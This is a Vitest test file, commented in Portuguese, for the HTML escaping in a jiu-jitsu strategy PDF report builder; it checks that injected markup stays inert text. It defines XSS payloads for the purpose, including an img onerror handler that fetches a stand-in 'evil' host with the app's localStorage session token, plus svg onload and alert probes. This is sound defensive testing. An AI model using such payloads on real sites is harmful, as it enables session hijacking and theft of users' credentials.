/**
 * SPEC-010 (R1) — o sink de XSS do relatório em PDF.
 *
 * O conteúdo interpolado aqui é **gerado por IA sobre vídeo de terceiros** e ia
 * para `innerHTML`. `innerHTML` não executa `<script>`, mas **executa
 * handlers** — `<img src=x onerror=...>` — e com o JWT em `localStorage` isso
 * é roubo de sessão válida por 7 a 30 dias.
 *
 * Estes testes não verificam "tem escape em algum lugar": verificam que a
 * carga maliciosa **não sobrevive como HTML executável** e que o texto legítimo
 * continua chegando ao relatório.
 */
import { describe, it, expect } from 'vitest';
import { escapeHtml, escapeDeep, buildStrategyReportHtml } from '../strategyReportHtml';

const CARGA = '<img src=x onerror="fetch(`//evil/?t=${localStorage.jiumetrics_token}`)">';

const analise = (strategy) => ({
  athlete_name: 'Atleta A',
  opponent_name: 'Adversário B',
  created_at: '2026-08-18T10:00:00.000Z',
  strategy_data: { strategy },
});

describe('escapeHtml', () => {
  it('neutraliza os caracteres que dão significado a HTML', () => {
    expect(escapeHtml('<b>x</b>')).toBe('&lt;b&gt;x&lt;/b&gt;');
    expect(escapeHtml('a & b')).toBe('a &amp; b');
    expect(escapeHtml(`"'`)).toBe('&quot;&#39;');
  });

  it('não é aplicado duas vezes por acidente em número ou nulo', () => {
    expect(escapeHtml(42)).toBe('42');
    expect(escapeHtml(null)).toBe('null');
  });
});

describe('escapeDeep', () => {
  it('escapa strings em qualquer profundidade, inclusive em arrays', () => {
    const entrada = { a: { b: [{ c: '<script>' }] } };

    expect(escapeDeep(entrada)).toEqual({ a: { b: [{ c: '&lt;script&gt;' }] } });
  });

  it('escapa as CHAVES também', () => {
    // O template faz Object.entries e imprime a chave (ex.: as fases da
    // cronologia), então uma chave maliciosa seria injeção pelo mesmo caminho.
    const escapado = escapeDeep({ '<img onerror=1>': 'valor' });

    expect(Object.keys(escapado)[0]).toBe('&lt;img onerror=1&gt;');
  });

  it('preserva números e booleanos sem transformar em string', () => {
    expect(escapeDeep({ n: 42, b: true, z: null })).toEqual({ n: 42, b: true, z: null });
  });
});

/**
 * A pergunta que importa não é "a string contém `onerror`?" — o texto
 * ESCAPADO contém, e isso é inofensivo. É "o navegador constrói um nó
 * perigoso?". Então a verificação é feita no DOM, como o browser faria.
 */
function nosPerigosos(html) {
  const doc = new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html');
  const perigosos = doc.querySelectorAll('img, svg, script, iframe, object, embed');
  const comHandler = [...doc.querySelectorAll('*')].filter((el) =>
    [...el.attributes].some((attr) => attr.name.toLowerCase().startsWith('on'))
  );
  return { tags: perigosos.length, handlers: comHandler.length, texto: doc.body.textContent };
}

describe('buildStrategyReportHtml — a carga maliciosa não sobrevive', () => {
  it('handler de evento vindo de um campo de estratégia fica inerte', () => {
    const html = buildStrategyReportHtml(
      analise({ resumo_rapido: { como_vencer: CARGA } })
    );
    const { tags, handlers, texto } = nosPerigosos(html);

    // Nenhum nó executável foi construído...
    expect(tags).toBe(0);
    expect(handlers).toBe(0);
    // ...e a carga sobrevive como TEXTO visível, não como HTML
    expect(texto).toContain('<img src=x onerror=');
  });

  it('nome do atleta com HTML não injeta no cabeçalho', () => {
    const html = buildStrategyReportHtml({
      ...analise({ resumo_rapido: { como_vencer: 'ok' } }),
      athlete_name: '<svg onload=alert(1)>',
    });
    const { tags, handlers } = nosPerigosos(html);

    expect(tags).toBe(0);
    expect(handlers).toBe(0);
  });

  it('carga dentro de lista (3 prioridades) fica inerte', () => {
    const html = buildStrategyReportHtml(
      analise({ resumo_rapido: { como_vencer: 'ok', tres_prioridades: ['normal', CARGA] } })
    );
    const { tags, handlers, texto } = nosPerigosos(html);

    expect(tags).toBe(0);
    expect(handlers).toBe(0);
    expect(texto).toContain('normal');
  });

  it('carga em CHAVE de objeto (cronologia) fica inerte', () => {
    const html = buildStrategyReportHtml(
      analise({
        resumo_rapido: { como_vencer: 'ok' },
        cronologia_inteligente: { '<img src=x onerror=alert(1)>': 'conteúdo da fase' },
      })
    );
    const { tags, handlers, texto } = nosPerigosos(html);

    expect(tags).toBe(0);
    expect(handlers).toBe(0);
    expect(texto).toContain('conteúdo da fase');
  });

  it('carga em campo aninhado do checklist fica inerte', () => {
    const html = buildStrategyReportHtml(
      analise({
        resumo_rapido: { como_vencer: 'ok' },
        checklist_tatico: { fazer: [{ tecnica: CARGA, por_que_funciona: CARGA }] },
      })
    );
    const { tags, handlers } = nosPerigosos(html);

    expect(tags).toBe(0);
    expect(handlers).toBe(0);
  });

  it('o relatório legítimo também não tem nó perigoso nenhum', () => {
    // Garante que os testes acima não passam por o relatório ser sempre vazio.
    const html = buildStrategyReportHtml(
      analise({ resumo_rapido: { como_vencer: 'Pressionar e passar.' } })
    );
    const { tags, handlers, texto } = nosPerigosos(html);

    expect(tags).toBe(0);
    expect(handlers).toBe(0);
    expect(texto).toContain('Pressionar e passar');
  });
});

describe('buildStrategyReportHtml — o relatório continua sendo o relatório', () => {
  // As asserções aqui usam o TEXTO renderizado, não a string de HTML: o
  // template tem comentários estáticos (`<!-- Checklist Tático -->`) que
  // existem mesmo quando a seção não é renderizada, e casar com eles daria
  // falso positivo. `textContent` ignora comentários, como a tela faz.
  const textoDe = (html) =>
    new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html').body.textContent;

  const completa = analise({
    resumo_rapido: {
      como_vencer: 'Pressionar a guarda e forçar o erro. Manter o centro.',
      tres_prioridades: ['Controlar as pegadas', 'Passar pelo lado fraco'],
    },
    analise_de_matchup: { vantagem_critica: 'Melhor cardio no terceiro round.' },
    checklist_tatico: {
      oportunidades_de_pontos: [{ tecnica: 'Passagem torreando', pontos: 3 }],
      armadilhas_dele: [{ situacao: 'Guarda de laço', como_evitar: 'Não dar a costa.' }],
      se_estiver_perdendo: 'Buscar raspagem e somar vantagem.',
    },
    cronologia_inteligente: { primeiro_minuto: 'Estudar as pegadas.' },
  });

  it('inclui nomes, data e as seções preenchidas', () => {
    const texto = textoDe(buildStrategyReportHtml(completa));

    expect(texto).toContain('Atleta A');
    expect(texto).toContain('Adversário B');
    expect(texto).toContain('18/08/2026');
    expect(texto).toContain('Como Vencer Esta Luta');
    expect(texto).toContain('Controlar as pegadas');
    expect(texto).toContain('Melhor cardio no terceiro round');
    expect(texto).toContain('Passagem torreando');
    expect(texto).toContain('Guarda de laço');
    expect(texto).toContain('Buscar raspagem e somar vantagem');
    // chave da cronologia com `_` virando espaço, como antes
    expect(texto).toContain('primeiro minuto');
    expect(texto).toContain('Estudar as pegadas');
  });

  it('acentuação e caracteres especiais chegam legíveis, não como entidade', () => {
    const texto = textoDe(
      buildStrategyReportHtml(
        analise({ resumo_rapido: { como_vencer: 'Pressão & atenção às pegadas "altas".' } })
      )
    );

    // O escape é revertido pelo parser — é o que o usuário vê no PDF.
    expect(texto).toContain('Pressão & atenção às pegadas "altas".');
  });

  it('omite as seções ausentes em vez de renderizar vazio', () => {
    const texto = textoDe(
      buildStrategyReportHtml(analise({ resumo_rapido: { como_vencer: 'só isso' } }))
    );

    expect(texto).toContain('só isso');
    expect(texto).not.toContain('Cronologia Inteligente');
    expect(texto).not.toContain('Checklist Tático');
  });

  it('aceita strategy_data com os campos aninhados em JSON string', () => {
    // O template desserializa `plano_tatico_faseado`, `checklist_tatico` e
    // `cronologia_inteligente` quando vêm como string.
    const texto = textoDe(
      buildStrategyReportHtml(
        analise({
          resumo_rapido: { como_vencer: 'ok' },
          cronologia_inteligente: JSON.stringify({ abertura: 'Testar reações.' }),
        })
      )
    );

    expect(texto).toContain('Testar reações');
  });

  it('não quebra com estratégia vazia', () => {
    expect(() => buildStrategyReportHtml(analise({}))).not.toThrow();
    expect(() => buildStrategyReportHtml({ strategy_data: null })).not.toThrow();
  });
});
